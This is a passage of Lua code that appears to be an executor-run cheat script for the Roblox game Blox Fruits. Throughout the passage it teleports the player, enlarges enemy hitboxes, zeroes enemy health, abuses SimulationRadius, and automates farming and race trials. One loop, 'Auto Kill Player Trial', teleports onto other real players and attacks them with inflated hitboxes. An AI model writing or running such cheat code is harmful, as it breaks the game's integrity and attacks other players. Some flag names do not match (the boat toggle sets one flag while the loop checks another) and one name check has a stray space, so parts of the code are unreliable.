    local tweenfunc = {}
    
    function tweenfunc:Stop()
        tween:Cancel()
    end
    
    return tweenfunc
end
    
function TPP(CFgo)
    if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health <= 0 or not game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid") then tween:Cancel() repeat wait() until game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid") and game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Health > 0 wait(7) return end
    local tween_s = game:service"TweenService"
    local info = TweenInfo.new((game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.Position - CFgo.Position).Magnitude/325, Enum.EasingStyle.Linear)
    tween = tween_s:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], info, {CFrame = CFgo})
    tween:Play()
    
    local tweenfunc = {}
    
    function tweenfunc:Stop()
        tween:Cancel()
    end
    
    return tweenfunc
end
    
getgenv().ToTargets = function(p)
    task.spawn(function()
        pcall(function()
            if game:GetService("Players").LocalPlayer:DistanceFromCharacter(p.Position) <= 250 then 
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = p
            elseif not game.Players.LocalPlayer.Character:FindFirstChild("Root")then 
                local K = Instance.new("Part",game.Players.LocalPlayer.Character)
                K.Size = Vector3.new(1,0.5,1)
                K.Name = "Root"
                K.Anchored = true
                K.Transparency = 1
                K.CanCollide = false
                K.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,20,0)
            end
            local U = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude
            local z = game:service("TweenService")
            local B = TweenInfo.new((p.Position-game.Players.LocalPlayer.Character.Root.Position).Magnitude/300,Enum.EasingStyle.Linear)
            local S,g = pcall(function()
            local q = z:Create(game.Players.LocalPlayer.Character.Root,B,{CFrame = p})
            q:Play()
        end)
        if not S then 
            return g
        end
        game.Players.LocalPlayer.Character.Root.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            if S and game.Players.LocalPlayer.Character:FindFirstChild("Root") then 
                pcall(function()
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude >= 20 then 
                        spawn(function()
                            pcall(function()
                                if (game.Players.LocalPlayer.Character.Root.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 150 then 
                                    game.Players.LocalPlayer.Character.Root.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                else 
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game.Players.LocalPlayer.Character.Root.CFrame
                                end
                            end)
                        end)
                    elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude >= 10 and(game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude < 20 then 
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p
                    elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude < 10 then 
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p
                    end
                end)
            end
        end)
    end)
end
Mys3:Toggle("Auto Boat to Sea 6",false,function(v)
    _G.AutoDriveBoat6sea = v
end)
spawn(function()
    while wait() do
        pcall(function()
            if _G.CrazzyAutoDriveBoat then
                if not game:GetService("Workspace").Boats:FindFirstChild("PirateBrigade") then
                    buyb = TPP(CFrame.new(-16927.451171875, 9.0863618850708, 433.8642883300781))
                    if (CFrame.new(-16927.451171875, 9.0863618850708, 433.8642883300781).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 10 then
                        if buyb then buyb:Stop() end
                        local args = {
                            [1] = "BuyBoat",
                            [2] = "PirateBrigade"
                        }

                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                    end
                elseif game:GetService("Workspace").Boats:FindFirstChild("PirateBrigade") then
                    if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit == false then
                        TPP(game:GetService("Workspace").Boats.PirateBrigade.VehicleSeat.CFrame * CFrame.new(0,1,0))
                    else
                        for i,v in pairs(game:GetService("Workspace").Boats:GetChildren()) do
                            if v.Name == "PirateBrigade" then
                                repeat wait()
                                    if (CFrame.new(-17013.80078125, 10.962434768676758, 438.0169982910156).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 10 then
                                        TPB(CFrame.new(-33163.1875, 10.964323997497559, -324.4842224121094))
                                    elseif (CFrame.new(-33163.1875, 10.964323997497559, -324.4842224121094).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 10 then
                                        TPB(CFrame.new(-37952.49609375, 10.96342945098877, -1324.12109375))
                                    elseif (CFrame.new(-37952.49609375, 10.96342945098877, -1324.12109375).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 10 then
                                        TPB(CFrame.new(-33163.1875, 10.964323997497559, -324.4842224121094))
                                    end 
                                until game:GetService("Workspace").Enemies:FindFirstChild("Shark") or game:GetService("Workspace").Enemies:FindFirstChild("Terrorshark") or game:GetService("Workspace").Enemies:FindFirstChild("Piranha") or game:GetService("Workspace").Enemies:FindFirstChild("Fish Crew Member") or _G.DomadicAutoDriveBoat == false
                            end
                        end
                    end
                end
            end
        end)
    end
end)
Mys3:Toggle("Auto SeaBeast",false,function(v)
    _G.SeaBeasts1 = v
    _G.NChest = v
end)
Mys3:Toggle("Auto TerrorShark",false,function(v)
    _G.AutoTerrorShark = v
    _G.NChest = v
end)
Mys3:Toggle("Auto Piranha",false,function(v)
    _G.AutoPiranha = v
    _G.NChest = v
end)
Mys3:Toggle("Auto Shark",false,function(v)
    _G.AutoShark = v
    _G.NChest = v
end)
Mys3:Toggle("Auto Fish Crew Member",false,function(v)
    _G.AutoFCMember = v
    _G.NChest = v
end)
Mys:Toggle("Auto Drive Boat (Seat on boat)",false,function(v)
    _G.DriveBoat = v
end)
spawn(function()
    while task.wait() do
        if _G.AutoFCMember then
            pcall(function()
                if (game:GetService("Workspace")).Enemies:FindFirstChild("Fish Crew Member") then
                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                            if v.Name == "Fish Crew Member" then
                                repeat
                                    task.wait();
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60);
                                    v.HumanoidRootPart.Transparency = 1;
                                    v.Humanoid.JumpPower = 0;
                                    v.Humanoid.WalkSpeed = 0;
                                    v.HumanoidRootPart.CanCollide = false;
                                    FarmPos = v.HumanoidRootPart.CFrame;
                                    MonFarm = v.Name;
                                    (game:GetService("VirtualUser")):CaptureController();
                                    (game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672), game:GetService("Workspace").CurrentCamera.CFrame);
                                until not _G.AutoFCMember or (not v.Parent) or v.Humanoid.Health <= 0;
                            end;
                        end;
                    end;
                else
                    loc387785 = ((game:GetService("ReplicatedStorage")):FindFirstChild("Fish Crew Member")).HumanoidRootPart.CFrame;
                    getgenv().ToPos(loc387785 * CFrame.new(2,20,2));
                end;
            end);
        end;
    end;
end);
spawn(function()
    while task.wait() do
        if _G.AutoShark then
            pcall(function()
                if (game:GetService("Workspace")).Enemies:FindFirstChild("Shark") then
                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                            if v.Name == "Shark" then
                                repeat
                                    task.wait();
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60);
                                    v.HumanoidRootPart.Transparency = 1;
                                    v.Humanoid.JumpPower = 0;
                                    v.Humanoid.WalkSpeed = 0;
                                    v.HumanoidRootPart.CanCollide = false;
                                    FarmPos = v.HumanoidRootPart.CFrame;
                                    MonFarm = v.Name;
                                    (game:GetService("VirtualUser")):CaptureController();
                                    (game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672), game:GetService("Workspace").CurrentCamera.CFrame);
                                until not _G.AutoShark or (not v.Parent) or v.Humanoid.Health <= 0;
                            end;
                        end;
                    end;
                else
                    loc387785 = ((game:GetService("ReplicatedStorage")):FindFirstChild("Shark")).HumanoidRootPart.CFrame;
                    getgenv().ToPos(loc387785 * CFrame.new(2,20,2));
                end;
            end);
        end;
    end;
end);
spawn(function()
    while task.wait() do
        if _G.AutoPiranha then
            pcall(function()
                if (game:GetService("Workspace")).Enemies:FindFirstChild("Piranha") then
                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                            if v.Name == "Piranha" then
                                repeat
                                    task.wait();
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60);
                                    v.HumanoidRootPart.Transparency = 1;
                                    v.Humanoid.JumpPower = 0;
                                    v.Humanoid.WalkSpeed = 0;
                                    v.HumanoidRootPart.CanCollide = false;
                                    FarmPos = v.HumanoidRootPart.CFrame;
                                    MonFarm = v.Name;
                                    (game:GetService("VirtualUser")):CaptureController();
                                    (game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672), game:GetService("Workspace").CurrentCamera.CFrame);
                                until not _G.AutoPiranha or (not v.Parent) or v.Humanoid.Health <= 0;
                            end;
                        end;
                    end;
                else
                    loc387785 = ((game:GetService("ReplicatedStorage")):FindFirstChild("Piranha")).HumanoidRootPart.CFrame;
                    getgenv().ToPos(loc387785 * CFrame.new(2,20,2));
                end;
            end);
        end;
    end;
end);
spawn(function()
	while task.wait() do
		if _G.AutoTerrorShark then
			pcall(function()
				if (game:GetService("Workspace")).Enemies:FindFirstChild("Terrorshark") then
					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
						if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
							if v.Name == "Terrorshark " then
								repeat
									task.wait();
									getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
									v.HumanoidRootPart.Size = Vector3.new(60, 60, 60);
									v.HumanoidRootPart.Transparency = 1;
									v.Humanoid.JumpPower = 0;
									v.Humanoid.WalkSpeed = 0;
									v.HumanoidRootPart.CanCollide = false;
									FarmPos = v.HumanoidRootPart.CFrame;
									MonFarm = v.Name;
									(game:GetService("VirtualUser")):CaptureController();
									(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672), game:GetService("Workspace").CurrentCamera.CFrame);
								until not _G.AutoTerrorShark or (not v.Parent) or v.Humanoid.Health <= 0;
							end;
						end;
					end;
				else
					loc5 = ((game:GetService("ReplicatedStorage")):FindFirstChild("Terrorshark")).HumanoidRootPart.CFrame;
					getgenv().ToPos(loc5);
				end;
			end);
		end;
	end;
end);
Mys1:Toggle("Auto Flowers ( Race V2 )",false,function(v)
    _G.AutoFlowerAll = v
end)
spawn(function()
	while task.wait() do
		if _G.AutoFlowerAll then
			pcall(function()
                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist","1") == 0 then
                    getgenv().ToPos(CFrame.new(-2779.83521, 72.9661407, -3574.02002, -0.730484903, 6.39014104e-08, -0.68292886, 3.59963224e-08, 1, 5.50667032e-08, 0.68292886, 1.56424669e-08, -0.730484903))
                    if (Vector3.new(-2779.83521, 72.9661407, -3574.02002) - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 4 then
                        wait(1.3)
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist","2")
                    end
                elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist","1") == 1 then
                    if _G.AutoFlowerAll then 
                        if not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 1") and not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Flower 1") then
                            if game:GetService("Workspace"):FindFirstChild("Flower1") then
                                getgenv().ToPos(game:GetService("Workspace").Flower1.CFrame)
                            end
                        end
                        if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 1") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Flower 1") then
                            if not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 2") and not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Flower 2") then
                                if game:GetService("Workspace"):FindFirstChild("Flower2") then
                                    getgenv().ToPos(game:GetService("Workspace").Flower2.CFrame)
                                end
                            end
                        end
                        if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 1") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Flower 1") then
                            if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 2") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Flower 2") then
                                if not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Flower 3") and not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Flower 3") then
                                    _G.KilledSwanPirate = true
                                else
                                    _G.KilledSwanPirate = false
                                end
                            end
                        end
                    end
                end
			end)
        else
            _G.KilledSwanPirate = false
		end
	end
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.KilledSwanPirate and StartMagnetSwanPriateMon and (v.Name == "Swan Pirate") and (v.HumanoidRootPart.Position - PosMonSwanPriate.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosMonSwanPriate
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(60,60,60)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)
spawn(function()
    while wait() do
        if _G.KilledSwanPirate then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Swan Pirate") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Swan Pirate" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetSwanPriateMon = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosMonSwanPriate = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.KilledSwanPirate == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetSwanPriateMon = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Swan Pirate" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(970.369446, 142.653198, 1217.3667, 0.162079468, -4.85452638e-08, -0.986777723, 1.03357589e-08, 1, -4.74980872e-08, 0.986777723, -2.50063148e-09, 0.162079468))
                end
            end)
        end
    end
end)
Mys1:Toggle("Auto Arowe Quest ( Race V3 )",false,function(v)
    _G.AutoAroweQuestVer = v
end)
spawn(function()
	while task.wait() do
		if _G.AutoAroweQuestVer then
			pcall(function()
                AlchemyNotify("Coming Soon!",3)
                wait(1)
			end)
		end
	end
end)
Mys1:Toggle("Auto Race Trial ( Race V4 )",false,function(v)
    _G.AutoQuestRace = v
end)
spawn(
    function()
        pcall(
            function()
                while wait() do
                    if _G.AutoQuestRace then
                        if game:GetService("Players").LocalPlayer.Data.Race.Value == "Human" then
                            for i,v in pairs(game.Workspace.Enemies:GetDescendants()) do
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    pcall(function()
                                        repeat wait(.1)
                                            v.Humanoid.Health = 0
                                            v.HumanoidRootPart.CanCollide = false
                                            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                                        until not _G.AutoQuestRace or not v.Parent or v.Humanoid.Health <= 0
                                    end)
                                end
                            end
                        elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Ghoul" then
                            KillAura = true
                        elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Skypiea" then
                            for i, v in pairs((game:GetService("Workspace")).Map.SkyTrial.Model:GetDescendants()) do
                                topos(game.Workspace.Map.SkyTrial.Model.FinishPart.CFrame)
                            end
                        elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Fishman" then
                            for i, v in pairs((game:GetService("Workspace")).SeaBeasts.SeaBeast1:GetDescendants()) do
                                if v.Name == "HumanoidRootPart" then
                                    topos(v.CFrame * CFrame.new(PosX, PosY, PosZ))
                                    for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                        if v:IsA("Tool") then
                                            if v.ToolTip == "Melee" then
                                                game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                                            end
                                        end
                                    end
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        true,
                                        122,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        122,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    wait(0.2)
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        true,
                                        120,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        120,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    wait(0.2)
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        true,
                                        99,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        99,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    wait(0.2)
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        99,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                        if v:IsA("Tool") then
                                            if v.ToolTip == "Blox Fruit" then
                                                game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                                            end
                                        end
                                    end
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        true,
                                        122,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        122,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    wait(0.2)
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        true,
                                        120,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        120,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    wait(0.2)
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        true,
                                        99,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        99,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    wait(0.5)
                                    for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                        if v:IsA("Tool") then
                                            if v.ToolTip == "Sword" then
                                                game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                                            end
                                        end
                                    end
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        true,
                                        122,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        122,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    wait(0.2)
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        true,
                                        120,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        120,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    wait(0.2)
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        true,
                                        99,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        99,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    wait(0.5)
                                    for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                        if v:IsA("Tool") then
                                            if v.ToolTip == "Gun" then
                                                game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                                            end
                                        end
                                    end
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        true,
                                        122,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        122,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    wait(0.2)
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        true,
                                        120,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        120,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    wait(0.2)
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        true,
                                        99,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                    game:GetService("VirtualInputManager"):SendKeyEvent(
                                        false,
                                        99,
                                        false,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart
                                    )
                                end
                            end
                        elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Cyborg" then
                            topos(CFrame.new(-20010.7637, 10040.4004, -25.7639999, 1, 0, 0, 0, 1, 0, 0, 0, 1))
                        elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Ghoul" then
                            for i, v in pairs(game.Workspace.Enemies:GetDescendants()) do
                                if
                                    v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
                                        v.Humanoid.Health > 0
                                 then
                                    pcall(
                                        function()
                                            repeat
                                                wait(0.1)
                                                v.Humanoid.Health = 0
                                                v.HumanoidRootPart.CanCollide = false
                                                sethiddenproperty(
                                                    game.Players.LocalPlayer,
                                                    "SimulationRadius",
                                                    math.huge
                                                )
                                            until not _G.AutoQuestRace or (not v.Parent) or v.Humanoid.Health <= 0
                                        end
                                    )
                                end
                            end
                        elseif game:GetService("Players").LocalPlayer.Data.Race.Value == "Mink" then
                            for i, v in pairs((game:GetService("Workspace")):GetDescendants()) do
                                if v.Name == "StartPoint" then
                                    topos(v.CFrame * CFrame.new(0, 9, 0))
                                end
                            end
                        end
                    end
                end
            end
        )
    end
)
Mys1:Toggle("Auto Kill Player Trial",false,function(v)
    _G.AAS_Kill_PlayerBB = v
    _G.AAS_Kill_PlayerSpam = v
    PlayerAura = v
end)
spawn(
    function()
        while wait() do
            pcall(
                function()
                    if _G.AAS_Kill_PlayerBB then
                        for i, v in pairs((game:GetService("Workspace")).Characters:GetChildren()) do
                            if
                                v.Name ~= game.Players.LocalPlayer.Name and
                                    (v.HumanoidRootPart.Position -
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100
                             then
                                if v.Humanoid.Health > 0 then
                                    repeat
                                        wait()
                                        AutoHaki()
                                        EquipWeapon(_G.SelectWeapon)
                                        NameTarget = v.Name
                                        topos(v.HumanoidRootPart.CFrame * CFrame.new(10, 5, 10))
                                        v.HumanoidRootPart.CanCollide = false
                                        v.HumanoidRootPart.Size = Vector3.new(100, 100, 100)
                                        Click()
                                    until not _G.AAS_Kill_PlayerBB or (not v.Parent) or v.Humanoid.Health <= 0
                                end
                            end
                        end
                    end
                end
            )
        end
    end
)
spawn(
    function()
        while wait() do
            pcall(
                function()
                    if _G.AAS_Kill_PlayerSpam then
                        for i, v in pairs((game:GetService("Workspace")).Characters:GetChildren()) do
                            if
                                v.Name ~= game.Players.LocalPlayer.Name and
                                    (v.HumanoidRootPart.Position -
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100
                             then
                                if v.Humanoid.Health > 0 then
                                    repeat
                                        wait()
                                        AutoHaki()
                                        EquipWeapon(_G.SelectWeapon)
                                        NameTarget = v.Name
                                        topos(v.HumanoidRootPart.CFrame * CFrame.new(10, 5, 10))
                                        v.HumanoidRootPart.CanCollide = false
                                        v.HumanoidRootPart.Size = Vector3.new(100, 100, 100)
                                        Click()
                                        game:GetService("VirtualInputManager"):SendKeyEvent(
                                            true,
                                            122,
                                            false,
                                            game.Players.LocalPlayer.Character.HumanoidRootPart
                                        )
                                        game:GetService("VirtualInputManager"):SendKeyEvent(
                                            false,
                                            122,
                                            false,
                                            game.Players.LocalPlayer.Character.HumanoidRootPart
                                        )
                                        wait(0.2)
                                        game:GetService("VirtualInputManager"):SendKeyEvent(
                                            true,
                                            120,
                                            false,
                                            game.Players.LocalPlayer.Character.HumanoidRootPart
                                        )
                                        game:GetService("VirtualInputManager"):SendKeyEvent(
                                            false,
                                            120,
                                            false,
                                            game.Players.LocalPlayer.Character.HumanoidRootPart
                                        )
                                        wait(0.2)
                                        game:GetService("VirtualInputManager"):SendKeyEvent(
                                            true,
                                            99,
                                            false,
                                            game.Players.LocalPlayer.Character.HumanoidRootPart
                                        )
                                        game:GetService("VirtualInputManager"):SendKeyEvent(
                                            false,
                                            99,
                                            false,
                                            game.Players.LocalPlayer.Character.HumanoidRootPart
                                        )
                                        wait(0.2)
                                        game:GetService("VirtualInputManager"):SendKeyEvent(
                                            false,
                                            "C",
                                            false,
                                            game.Players.LocalPlayer.Character.HumanoidRootPart
                                        )
                                    until not _G.AAS_Kill_PlayerBB or (not v.Parent) or v.Humanoid.Health <= 0
                                end
                            end
                        end
                    end
                end
            )
        end
    end
)
spawn(function()
    while wait() do
        if _G.SeaBeasts1 then
            pcall(function()
                for i,v in pairs(game:GetService("Workspace").SeaBeasts:GetChildren()) do
                    if v:FindFirstChild("HumanoidRootPart") then
                        getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(1,450,45))
                        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                            if v:IsA("Tool") then
                                if v.ToolTip == "Melee" then -- "Blox Fruit" , "Sword" , "Wear" , "Agility"
                                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                                end
                            end
                        end
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,"C",false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                            if v:IsA("Tool") then
                                if v.ToolTip == "Blox Fruit" then -- "Blox Fruit" , "Sword" , "Wear" , "Agility"
                                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                                end
                            end
                        end
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,122,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,120,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,99,false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(.2)
                        game:GetService("VirtualInputManager"):SendKeyEvent(true,"V",false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        game:GetService("VirtualInputManager"):SendKeyEvent(false,"V",false,game.Players.LocalPlayer.Character.HumanoidRootPart)
                        wait(0.6)
                        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                            if v:IsA("Tool") then
                                if v.ToolTip == "Sword" then -- "Blox Fruit" , "Sword" , "Wear" , "Agility"
